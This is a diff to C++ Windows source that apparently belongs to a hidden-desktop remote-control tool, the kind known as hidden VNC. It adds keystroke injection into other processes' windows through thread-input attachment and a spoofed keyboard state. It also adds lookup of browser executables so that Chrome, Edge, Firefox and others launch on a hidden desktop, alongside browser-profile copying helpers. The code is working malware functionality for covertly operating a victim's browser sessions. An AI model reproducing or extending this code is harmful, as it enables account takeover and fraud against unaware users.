@@ -1309,6 +1309,53 @@ static void HandleMouseWheel(int delta) {
     PostMessageW(hwnd, WM_MOUSEWHEEL, wp, MAKELPARAM(g_curX, g_curY));
 }
 
+static void set_key_down(BYTE state[256], int vk, bool down) {
+    if (vk >= 0 && vk < 256) state[vk] = down ? 0x80 : 0;
+}
+
+static void apply_modifier_state(BYTE state[256], bool ctrlDown, bool altDown, bool shiftDown) {
+    set_key_down(state, VK_CONTROL, ctrlDown);
+    set_key_down(state, VK_LCONTROL, ctrlDown);
+    set_key_down(state, VK_RCONTROL, ctrlDown);
+    set_key_down(state, VK_MENU, altDown);
+    set_key_down(state, VK_LMENU, altDown);
+    set_key_down(state, VK_RMENU, altDown);
+    set_key_down(state, VK_SHIFT, shiftDown);
+    set_key_down(state, VK_LSHIFT, shiftDown);
+    set_key_down(state, VK_RSHIFT, shiftDown);
+}
+
+static void send_keyboard_message(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam,
+                                  bool ctrlDown, bool altDown, bool shiftDown) {
+    DWORD targetThreadId = GetWindowThreadProcessId(hwnd, NULL);
+    DWORD currentThreadId = GetCurrentThreadId();
+    bool attached = false;
+
+    if (targetThreadId && targetThreadId != currentThreadId) {
+        attached = AttachThreadInput(currentThreadId, targetThreadId, TRUE) != FALSE;
+    }
+
+    BYTE oldState[256] = {};
+    BYTE newState[256] = {};
+    bool hasOldState = GetKeyboardState(oldState) != FALSE;
+    if (hasOldState) {
+        memcpy(newState, oldState, sizeof(newState));
+    }
+
+    apply_modifier_state(newState, ctrlDown, altDown, shiftDown);
+    SetKeyboardState(newState);
+
+    DWORD_PTR result = 0;
+    SendMessageTimeoutW(hwnd, msg, wParam, lParam, SMTO_ABORTIFHUNG, 100, &result);
+
+    if (hasOldState) {
+        SetKeyboardState(oldState);
+    }
+    if (attached) {
+        AttachThreadInput(currentThreadId, targetThreadId, FALSE);
+    }
+}
+
 static void HandleKey(int vk, bool down) {
     switch (vk) {
         case 0x10: case 0xA0: case 0xA1: g_shiftDown = down; break; // Shift
@@ -1338,30 +1385,10 @@ static void HandleKey(int vk, bool down) {
     LPARAM lpDn = (LPARAM)(1u | (scan << 16));
     LPARAM lpUp = (LPARAM)(0xC0000001u | (scan << 16));
 
-    bool isModifier = (vk == 0x10 || vk == 0xA0 || vk == 0xA1 || vk == 0x11 || vk == 0xA2 || vk == 0xA3 ||
-                       vk == 0x12 || vk == 0xA4 || vk == 0xA5 || vk == 0x14);
-    if (isModifier) {
-        PostMessageW(hwnd, down ? WM_KEYDOWN : WM_KEYUP, (WPARAM)vk, down ? lpDn : lpUp);
-        return;
-    }
+    UINT msg = down ? WM_KEYDOWN : WM_KEYUP;
+    LPARAM lp = down ? lpDn : lpUp;
 
-    if (down && g_ctrlDown && !g_altDown && vk >= 0x41 && vk <= 0x5A) {
-        PostMessageW(hwnd, WM_KEYDOWN, (WPARAM)vk, lpDn);
-        PostMessageW(hwnd, WM_CHAR, (WPARAM)(vk - 0x40), 1);
-        return;
-    }
-
-    if (down && !IsNonPrintableVK(vk) && !g_ctrlDown && !g_altDown) {
-        wstring chars = VkToChars(vk);
-        if (!chars.empty()) {
-            for (wchar_t ch : chars) {
-                PostMessageW(hwnd, WM_CHAR, (WPARAM)ch, 1);
-            }
-            return;
-        }
-    }
-
-    PostMessageW(hwnd, down ? WM_KEYDOWN : WM_KEYUP, (WPARAM)vk, down ? lpDn : lpUp);
+    send_keyboard_message(hwnd, msg, (WPARAM)vk, lp, g_ctrlDown, g_altDown, g_shiftDown);
 }
 
 // -------------------------------------------------------------------------
@@ -1398,7 +1425,7 @@ static void input_loop() {
                 if (!hwnd) hwnd = g_lastHwnd;
                 if (!hwnd) hwnd = GetForegroundWindow();
                 if (hwnd) {
-                    PostMessageW(hwnd, WM_CHAR, (WPARAM)vk, 1);
+                    send_keyboard_message(hwnd, WM_CHAR, (WPARAM)vk, 1, g_ctrlDown, g_altDown, g_shiftDown);
                 }
             } else {
                 HandleKey(vk, down);
@@ -1433,6 +1460,31 @@ static void input_loop() {
 // -------------------------------------------------------------------------
 //  Browser Profile Copying / Lock Cleaning / Repairing / Launch Helpers
 // -------------------------------------------------------------------------
+
+static wstring get_app_path(const wstring& appName) {
+    HKEY hKey;
+    wstring subkey = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\" + appName;
+    wstring path;
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        wchar_t buffer[MAX_PATH];
+        DWORD size = sizeof(buffer);
+        if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
+            path = buffer;
+        }
+        RegCloseKey(hKey);
+    }
+    if (path.empty()) {
+        if (RegOpenKeyExW(HKEY_CURRENT_USER, subkey.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+            wchar_t buffer[MAX_PATH];
+            DWORD size = sizeof(buffer);
+            if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
+                path = buffer;
+            }
+            RegCloseKey(hKey);
+        }
+    }
+    return path;
+}
 
 static wstring ResolveGlob(const wstring& path) {
     size_t star = path.find(L'*');
@@ -2040,6 +2092,39 @@ static void LaunchOnDesktop(string path, bool isRetry = false, bool cloneBrowser
     if (!g_hHiddenDesktop) return;
     ThreadDesktopSwitcher switcher(g_hHiddenDesktop);
     try {
+        wstring wRequestedPath(path.begin(), path.end());
+        wstring exeName = L"";
+        if (wRequestedPath == L"Google Chrome") exeName = L"chrome.exe";
+        else if (wRequestedPath == L"Microsoft Edge") exeName = L"msedge.exe";
+        else if (wRequestedPath == L"Firefox") exeName = L"firefox.exe";
+        else if (wRequestedPath == L"Waterfox") exeName = L"waterfox.exe";
+        else if (wRequestedPath == L"LibreWolf") exeName = L"librewolf.exe";
+
+        if (!exeName.empty()) {
+            wstring exePath = get_app_path(exeName);
+            if (exePath.empty()) {
+                if (wRequestedPath == L"Firefox") {
+                    exePath = L"C:\\Program Files\\Mozilla Firefox\\firefox.exe";
+                    if (!fs::exists(exePath)) exePath = L"C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe";
+                } else if (wRequestedPath == L"Waterfox") {
+                    exePath = L"C:\\Program Files\\Waterfox\\waterfox.exe";
+                } else if (wRequestedPath == L"LibreWolf") {
+                    exePath = L"C:\\Program Files\\LibreWolf\\librewolf.exe";
+                } else if (wRequestedPath == L"Google Chrome") {
+                    exePath = L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
+                    if (!fs::exists(exePath)) exePath = L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe";
+                } else if (wRequestedPath == L"Microsoft Edge") {
+                    exePath = L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
+                    if (!fs::exists(exePath)) exePath = L"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe";
+                }
+            }
+            if (!exePath.empty()) {
+                path = string(exePath.begin(), exePath.end());
+            } else {
+                path = string(exeName.begin(), exeName.end());
+            }
+        }
+
         // Expand environment variables
         if (path.find('%') != string::npos) {
             wchar_t wBuf[2048] = {0};
